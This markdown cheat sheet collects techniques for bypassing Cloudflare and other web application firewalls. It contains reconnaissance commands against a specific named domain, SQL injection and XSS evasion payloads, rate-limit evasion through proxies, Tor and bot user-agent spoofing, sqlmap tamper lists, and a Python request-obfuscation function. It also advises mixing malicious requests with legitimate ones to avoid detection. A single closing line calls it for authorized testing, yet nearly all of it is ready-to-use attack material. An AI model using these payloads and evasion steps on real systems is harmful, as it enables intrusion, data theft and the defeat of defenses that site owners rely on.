# 🛡️ WAF BYPASS ARSENAL - Cloudflare & Beyond

## Elite Evasion Techniques

---

## 🎯 CLOUDFLARE BYPASS METHODS

### 1. **Origin IP Discovery**
```bash
# DNS History Lookup
dig @8.8.8.8 rndsoftech.com +short
host rndsoftech.com

# Subdomain Enumeration (find unprotected subdomains)
dig rndsoftech.com ANY
nslookup -type=any rndsoftech.com

# Certificate Transparency Logs
curl "https://crt.sh/?q=%.rndsoftech.com&output=json"

# Historical DNS Records
whois rndsoftech.com | grep -i "IP\|Address"
```

### 2. **HTTP Header Manipulation**
```bash
# X-Originating-IP Spoofing
curl -H "X-Originating-IP: 127.0.0.1" https://target.com
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com
curl -H "X-Remote-IP: 127.0.0.1" https://target.com
curl -H "X-Remote-Addr: 127.0.0.1" https://target.com

# Host Header Bypass
curl -H "Host: localhost" https://target.com
curl -H "Host: 127.0.0.1" https://target.com
```

### 3. **Request Fragmentation**
```bash
# Split payloads across requests
# Instead of: SELECT * FROM users
# Use: SEL/**/ECT * FR/**/OM users

# HTTP Parameter Pollution
curl "https://target.com?id=1&id=2' OR '1'='1"

# Case Variation
# Normal: <script>alert(1)</script>
# Bypass: <ScRiPt>alert(1)</sCrIpT>
```

### 4. **Encoding Obfuscation**
```bash
# URL Encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Double URL Encoding
%253Cscript%253E

# Unicode Encoding
\u003cscript\u003e

# Hex Encoding
0x3c0x730x630x72...

# Base64
echo "SELECT * FROM users" | base64
```

### 5. **Time-Based Evasion**
```bash
# Slow scan (evade rate limiting)
nmap -T1 --scan-delay 5s target.com

# Random delays
for i in {1..10}; do 
  curl https://target.com/$i
  sleep $((RANDOM % 10))
done
```

---

## 🔥 SQL INJECTION WAF BYPASS

### Cloudflare-Specific
```sql
-- Comment-based bypass
SELECT/**/password/**/FROM/**/users

-- Case variation
SeLeCt * FrOm users

-- Inline comments
SELECT/*comment*/password/**/FROM users

-- Double encoding
%2527%2520UNION%2520SELECT

-- Hex encoding
SELECT 0x70617373776f7264 FROM users

-- Concatenation
SELECT CONCAT('adm','in') FROM users

-- Charset manipulation
SET NAMES 'utf8mb4' /*!32312*/; SELECT * FROM users
```

---

## 🎭 XSS WAF BYPASS

### Cloudflare Evasion
```javascript
// Case variation
<ScRiPt>alert(1)</sCrIpT>

// HTML entities
&lt;script&gt;alert(1)&lt;/script&gt;

// Unicode encoding
\u003cscript\u003ealert(1)\u003c/script\u003e

// Alternative tags
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>

// JavaScript protocol
<a href="javascript:alert(1)">Click</a>

// Null byte injection
<scri%00pt>alert(1)</scri%00pt>

// Attribute breaking
<input value="x" onclick="alert(1)">

// Event handlers
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

---

## 🚀 RATE LIMITING BYPASS

### 1. **IP Rotation**
```bash
# Use proxies
curl --proxy socks5://proxy:1080 https://target.com

# Tor rotation
torsocks curl https://target.com

# VPN hopping
# Rotate VPN servers every N requests
```

### 2. **User-Agent Rotation**
```bash
# Desktop browsers
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://target.com
curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" https://target.com

# Mobile devices
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)" https://target.com

# Bots (sometimes whitelisted)
curl -A "Googlebot/2.1" https://target.com
curl -A "bingbot/2.0" https://target.com
```

### 3. **Distributed Requests**
```bash
# Multiple source IPs
# Use cloud instances across regions
# AWS Lambda, Google Cloud Functions
# Rotate between different providers
```

---

## 🎯 CLOUDFLARE-SPECIFIC TECHNIQUES

### 1. **Origin Server Discovery**
```bash
# Check for mail server (often unprotected)
dig rndsoftech.com MX
nmap -p 25,587,465 mail.rndsoftech.com

# Subdomain scanning
for sub in www mail ftp admin dev staging test; do
  host $sub.rndsoftech.com
done

# SSL Certificate inspection
openssl s_client -connect rndsoftech.com:443 | grep "CN="

# Historical IP lookup
curl "https://securitytrails.com/domain/rndsoftech.com/history/a"
```

### 2. **HTTP/2 Exploitation**
```bash
# Some WAFs don't handle HTTP/2 properly
curl --http2 https://target.com

# Header smuggling
# Request splitting via HTTP/2
```

### 3. **WebSocket Bypass**
```bash
# WAF may not inspect WebSocket traffic
wscat -c wss://target.com/socket
```

---

## 🔧 PAYLOAD ENCODING MATRIX

| Type | Example | Use Case |
|------|---------|----------|
| URL Encoding | `%27` | Basic bypass |
| Double Encoding | `%2527` | WAF decodes once |
| Unicode | `\u0027` | JavaScript context |
| Hex | `0x27` | SQL injection |
| Octal | `\047` | String contexts |
| HTML Entities | `&#39;` | XSS bypass |
| Base64 | `Jw==` | Data exfiltration |

---

## 🎪 ADVANCED TECHNIQUES

### 1. **Race Conditions**
```bash
# Simultaneous requests to bypass token validation
for i in {1..100}; do
  curl https://target.com/api/action &
done
wait
```

### 2. **HTTP Verb Tampering**
```bash
# Try different methods
curl -X POST https://target.com
curl -X PUT https://target.com
curl -X DELETE https://target.com
curl -X TRACE https://target.com
curl -X OPTIONS https://target.com
```

### 3. **Content-Type Manipulation**
```bash
# XML to JSON
curl -H "Content-Type: application/json" -d '{"id":"1"}'

# Multipart form data
curl -F "file=@payload.txt" https://target.com/upload

# Alternative content types
curl -H "Content-Type: text/xml"
curl -H "Content-Type: application/x-www-form-urlencoded"
```

### 4. **Chunked Encoding**
```bash
# Transfer-Encoding: chunked
# Split payload across chunks
# WAF may not reassemble properly
```

---

## 🛠️ AUTOMATED BYPASS TOOLS

### 1. **SQLMap with Tamper Scripts**
```bash
# Cloudflare bypass
sqlmap -u "http://target.com?id=1" --tamper=space2comment

# Multiple tampers
sqlmap -u "http://target.com?id=1" \
  --tamper=between,randomcase,space2comment

# Available tampers:
# - apostrophemask
# - apostrophenullencode
# - base64encode
# - between
# - chardoubleencode
# - charencode
# - charunicodeencode
# - equaltolike
# - greatest
# - halfversionedmorekeywords
# - htmlencode
# - ifnull2ifisnull
# - modsecurityversioned
# - modsecurityzeroversioned
# - multiplespaces
# - percentage
# - randomcase
# - space2comment
# - space2hash
# - space2morehash
# - space2mysqldash
# - space2plus
# - space2randomblank
# - unionalltounion
# - unmagicquotes
# - versionedkeywords
# - versionedmorekeywords
```

### 2. **Burp Suite Intruder**
```bash
# Automated payload fuzzing
# Position markers: §payload§
# Attack types: Sniper, Battering ram, Pitchfork, Cluster bomb
# Payload processing: Encode, Hash, Add prefix/suffix
```

### 3. **Custom Scripts**
```python
import requests
import random
import time

def bypass_waf(url, payload):
    # Random user agents
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)"
    ]
    
    # Random headers
    headers = {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": f"127.0.0.{random.randint(1,255)}",
        "X-Originating-IP": "127.0.0.1",
        "Referer": url
    }
    
    # Random delay
    time.sleep(random.uniform(1, 5))
    
    # Execute request
    response = requests.get(url + payload, headers=headers)
    return response
```

---

## 🎯 CLOUDFLARE CHALLENGE BYPASS

### 1. **JavaScript Challenge**
```bash
# Use headless browser
# Selenium, Puppeteer, Playwright
# Execute JavaScript, solve challenge, extract cookies

# cloudscraper (Python)
pip install cloudscraper
python3 -c "import cloudscraper; scraper = cloudscraper.create_scraper(); print(scraper.get('https://target.com').text)"
```

### 2. **CAPTCHA Bypass**
```bash
# 2Captcha, Anti-Captcha services
# OCR for simple CAPTCHAs
# Audio CAPTCHA transcription
```

---

## 🚨 DETECTION EVASION

### 1. **Behavioral Mimicry**
```bash
# Act like a real browser
# - Load CSS/JS resources
# - Follow redirects
# - Accept cookies
# - Realistic timing between requests
```

### 2. **Session Management**
```bash
# Maintain sessions
curl -c cookies.txt -b cookies.txt https://target.com

# Reuse tokens
# Extract CSRF tokens, auth tokens
# Include in subsequent requests
```

### 3. **Fingerprint Avoidance**
```bash
# Avoid scanning patterns
# - Don't scan sequential IDs
# - Randomize parameter order
# - Vary request timing
# - Mix legitimate with malicious requests
```

---

## 📊 BYPASS SUCCESS INDICATORS

✅ Different response size/time
✅ Different HTTP status code
✅ SQL error messages
✅ JavaScript execution
✅ Successful data exfiltration
✅ Access to restricted resources

---

## ⚠️ OPERATIONAL NOTES

- **Start passive** - reconnaissance first
- **Test on staging** - find less protected environments
- **Document findings** - track what works
- **Iterate quickly** - WAF rules update constantly
- **Combine techniques** - layered approach works best

---

**Remember: Authorized testing only. WAF bypass for legitimate pentesting.**
